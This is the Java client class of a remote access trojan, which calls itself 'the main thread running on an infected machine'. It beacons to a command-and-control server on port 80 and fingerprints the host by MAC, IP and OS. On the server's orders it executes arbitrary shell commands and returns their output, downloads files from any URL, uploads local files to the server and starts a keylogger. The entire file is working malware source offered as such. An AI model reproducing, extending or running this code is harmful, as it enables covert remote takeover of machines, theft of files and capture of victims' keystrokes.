package client;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.ConnectException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;

import commands.CommandInterface;
import tools.Connection;
import tools.ParsedCommand;

/**
 * The main thread running on an infected machine
 * 
 * @author Yohan Chalier
 *
 */
public class Client extends Thread {
	
	/**
	 * Server url.
	 * Using a domain name to be able to change IP once compiled.
	 */
	// private static final String SERVER_URL = "http://rat.chalier.fr";
	private static final String SERVER_URL = "192.168.1.19";
	
	/**
	 * Server port. 80 by default, as often opened in firewalls.
	 */
	private static final int SERVER_PORT = 80;
	
	/**
	 *  Client cooldown between pings, in milliseconds.
	 */
	private static final int REFRESH_COOLDOWN = 10000;
	
	/**
	 * List of client commands.
	 */
	private HashMap<String, CommandInterface> commands;
	
	/**
	 * The current connection, kept alive until DONE is received.
	 */
	private Connection curConn;
	
	/**
	 * Wether to maintain the current connection or not.
	 */
	private boolean connected = false;
	
	/**
	 * Client's unique id, given by the server.
	 */
	private int id;
	
	private boolean logKeyboard = false;
	
	public Client() {
		commands = new HashMap<String, CommandInterface>();
		
		// Close connection
		commands.put("DONE", new CommandInterface(){

			@Override
			public String exec(ParsedCommand pCmd) {
				connected = false;
				curConn = null;
				return null;
			}
			
		});
		
		// Execute a shell command
		commands.put("EXEC", new CommandInterface(){

			@Override
			public String exec(ParsedCommand pCmd) {
				
				try {
					// Executing shell command
					Process p = Runtime.getRuntime().exec(pCmd.argLine());
					// Wait until finished
					p.waitFor();
					
					// Read for answer
					BufferedReader reader = new BufferedReader(
							new InputStreamReader(p.getInputStream()));
					String line;
					StringBuilder output = new StringBuilder();
					while ((line = reader.readLine()) != null) {
						output.append(line + "\n");
					}
					
					// Replaying with an OUT command
					send("OUT " + id, output.toString().getBytes());
					
				} catch (IOException | InterruptedException e) {
					// TODO Remove before production
					e.printStackTrace();
				}
				return null;
			}
			
		});
		
		// Download a file
		commands.put("DWNLD", new CommandInterface(){

			@Override
			public String exec(ParsedCommand pCmd) {
	
				try {
					download(pCmd.args[0], pCmd.args[1]);
					send("OUT", "File correctly downloaded.".getBytes());
					
				} catch (IOException e) {
					// TODO Remove before production
					e.printStackTrace();
				}
				
				return null;
			}
			
		});
		
		// Upload a file
		commands.put("UPLD", new CommandInterface(){

			@Override
			public String exec(ParsedCommand pCmd) {
				try {
					
					// Reading file length
					ArrayList<Byte> tmp = new ArrayList<Byte>();
					InputStream in = new FileInputStream(pCmd.args[0]);
					int c;
					while ((c = in.read()) != -1)
						tmp.add((byte) c);
					in.close();
					
					// Building payload
					byte[] payload = new byte[tmp.size()];
					for (int i = 0; i < tmp.size(); i++)
						payload[i] = tmp.get(i);
					
					// Sending request
					send("UPLD " + pCmd.args[1], payload);
					
				} catch (IOException e) {
					// TODO Remove before production
					e.printStackTrace();
				}
				return null;
			}
			
		});
		
		// Start keylogging
		Client _this = this;
		commands.put("KLOG", new CommandInterface(){

			@Override
			public String exec(ParsedCommand pCmd) {
				logKeyboard = true;
				new KeyLogger(_this).start();
				send("KSTART " + id, new byte[] {});
				return null;
			}
			
		});
		
	}
	
	public boolean doLogKeyboard() {
		return logKeyboard;
	}
	
	public int getClientId() {
		return id;
	}
	
	public Connection getCurConn() {
		return curConn;
	}
	
	/**
	 * Main client loop.
	 */
	@Override
	public void run(){
		
		try {
			// Retrieving id
			String response;
			while ((response = send("GETID " + getIdentity(),
					new byte[] {})).equals("")){
				// pass
			}
			id = Integer.parseInt(response);
			send("DONE", new byte[]{});
		} catch (NumberFormatException | SocketException e) {
			// TODO Remove before production
			e.printStackTrace();
		}
		
		while (true) {
			
			if (connected) {
				listen();
			} else {
				// Wait before sending a PING
				try {
					Thread.sleep(REFRESH_COOLDOWN);
				} catch (InterruptedException e) {
					// TODO Remove before production
					e.printStackTrace();
				}
				
				String response = send("PING " + id, new byte[] {});
				ParsedCommand pCmd = new ParsedCommand(response);
				if (commands.containsKey(pCmd.cmd))
					commands.get(pCmd.cmd).exec(pCmd);

			}
			
		}
	}
	
	/**
	 * Sends a request to the server.
	 * 
	 * @param request The request containing commands & identification
	 * @param payload Data to be transfered
	 * @return Server's response
	 */
	public String send(String request, byte[] payload) {
		
		try {
			
			// Opens a new connection if necessary
			if (curConn == null)
				curConn = new Connection(SERVER_URL, SERVER_PORT);
			
			// Sending request
			curConn.write(request, payload);
			
			// Blocks until response
			String response = curConn.readResponse();
			
			// Checking whether to close connection or not
			connected = false;
			if (response.toString().startsWith("DONE")) {
				curConn.close();
				curConn = null;
			} else {
				connected = true;
			}
			
			return response.toString();
		
		} catch (ConnectException e) {
			return "";
		} catch (IOException e) {
			// TODO Remove before production
			e.printStackTrace();
			return null;
			
		}
	}
	
	/**
	 * Waits for a request from the server
	 */
	private void listen() {
		
		if (curConn == null) {
			connected = false;
			return;
		}
		
		String request = curConn.readResponse();
		
		ParsedCommand pCmd = new ParsedCommand(request.toString());
		if (commands.containsKey(pCmd.cmd))
			commands.get(pCmd.cmd).exec(pCmd);
	}
	
	/**
	 * Retrieves client's MAC, IP and OS.
	 * 
	 * @return A string with all those information
	 * @throws SocketException
	 */
	private String getIdentity() throws SocketException {
		        
        // Iterating through all network card interfaces
        for (Enumeration<NetworkInterface> ifaces =
        		NetworkInterface.getNetworkInterfaces();
        		ifaces.hasMoreElements();) {
        	
            NetworkInterface iface = (NetworkInterface) ifaces.nextElement();
            
            // We omit addresses used by VirtualBox
            if (!iface.toString().contains("Virtual")) {
            	
            	// Iterating trough all addresses of the interface
            	for (Enumeration<InetAddress> inetAddrs =
            			iface.getInetAddresses();
            			inetAddrs.hasMoreElements();) {
            		
	                InetAddress inetAddr =
	                		(InetAddress) inetAddrs.nextElement();
	                
	                if (!inetAddr.isLoopbackAddress()) {
	                	
	                	// Binary representation of MAC address
	                	byte[] mac = iface.getHardwareAddress();
	                	
	                	// Printing into a string to be returned
	                	StringBuilder sb = new StringBuilder();
	            		for (int i = 0; i < mac.length; i++) {
	            			sb.append(String.format(
	            					"%02X%s",
	            					mac[i],
	            					(i < mac.length - 1) ? "-" : ""));
	            		}
	            		
	            		sb.append(" ");
	            		sb.append(inetAddr.toString());
	            		sb.append(" ");
	            		sb.append(System.getProperty("os.name"));
	            		
	            		return sb.toString();
	                }
	            }
            }
        }
        
        return null;
		
	}
	
	/**
	 * Download a file from any URL.
	 * 
	 * @param fileURL Url pointing to the file.
	 * @param fileName Local filename
	 * @throws IOException
	 */
	public static void download(String fileURL, String fileName)
			throws IOException {
		
		final int BUFFER_SIZE = 4096;
		
		URL url = new URL(fileURL);
        URLConnection conn = url.openConnection();

        // Opens input stream from the connection
        InputStream inputStream = conn.getInputStream();
         
        // Opens an output stream to save into file
        FileOutputStream outputStream = new FileOutputStream(fileName);
        
        // Reads and writes file
        int bytesRead = -1;
        byte[] buffer = new byte[BUFFER_SIZE];
        while ((bytesRead = inputStream.read(buffer)) != -1) {
            outputStream.write(buffer, 0, bytesRead);
        }
        
        // Closing streams
        outputStream.close();
        inputStream.close();
	}

}
